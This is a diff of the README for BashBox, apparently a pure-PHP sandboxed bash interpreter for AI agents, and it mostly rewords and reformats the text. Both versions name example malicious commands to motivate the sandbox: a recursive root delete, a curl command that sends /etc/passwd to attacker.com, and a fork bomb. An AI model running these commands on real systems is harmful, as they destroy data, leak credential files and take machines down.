@@ -9,16 +9,14 @@
     <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="License" src="https://img.shields.io/packagist/l/shipfastlabs/bashbox"></a>
 </p>
 
-------
-
-**BashBox** is a sandboxed bash interpreter for AI agents, written in pure PHP 8.4+. No `proc_open`, no `exec`, no `shell_exec` — every command is a PHP class, every file lives in a virtual filesystem, and every execution has hard limits.
+**BashBox** is a sandboxed bash interpreter for AI agents, written in pure PHP 8.4+. It does not use `proc_open`, `exec`, or `shell_exec`. Every command is a PHP class, every file lives in a virtual filesystem, and every execution has hard limits.
 
 > **Requires [PHP 8.4+](https://php.net/releases/)**
 
 
 ## Why BashBox?
 
-Imagine you're building an AI coding assistant. A user asks: *"Can you analyze my logs and find all error messages from the last hour?"*
+Imagine you are building an AI coding assistant. A user asks: "Can you analyze my logs and find all error messages from the last hour?"
 
 Your AI generates a bash script:
 
@@ -26,20 +24,16 @@ Your AI generates a bash script:
 cat /var/log/app.log | grep "ERROR" | awk '{print $1, $2, $5}' | sort | uniq -c | sort -rn
 ```
 
-**The problem:** Running user-generated bash code on your servers is dangerous. One malicious script could:
-- Delete critical files (`rm -rf /`)
-- Exfiltrate sensitive data (`curl -d @/etc/passwd attacker.com`)
-- Launch denial-of-service attacks (`:(){ :|:& };:`)
-- Access internal network resources (SSRF attacks)
+**The problem:** Running user-generated bash code on your servers is dangerous. One malicious script could delete critical files (`rm -rf /`), exfiltrate sensitive data (`curl -d @/etc/passwd attacker.com`), launch denial-of-service attacks (`:(){ :|:& };:`), or access internal network resources (SSRF attacks).
 
 **Traditional solutions** use containers or VMs, but those are slow, resource-heavy, and complex to orchestrate.
 
-**BashBox** takes a different approach: it implements a complete bash interpreter in pure PHP with zero system calls. Think of it as a "bash emulator" that gives you:
+**BashBox** takes a different approach. It implements a complete bash interpreter in pure PHP with zero system calls. Think of it as a "bash emulator" that gives you:
 
-- ⚡ **Instant execution** — no container startup time
-- 🛡️ **True isolation** — no access to your real filesystem or network (unless you explicitly allow it)
-- 🎛️ **Fine-grained control** — limit commands, loops, memory, and execution time
-- 🔧 **Full bash compatibility** — pipes, redirects, functions, control flow, substitutions, and more
+- **Instant execution** with no container startup time
+- **True isolation** with no access to your real filesystem or network unless you explicitly allow it
+- **Fine-grained control** to limit commands, loops, memory, and execution time
+- **Full bash compatibility** including pipes, redirects, functions, control flow, and substitutions
 
 Perfect for AI agents, code execution platforms, CI/CD systems, or anywhere you need to run untrusted bash scripts safely.
 
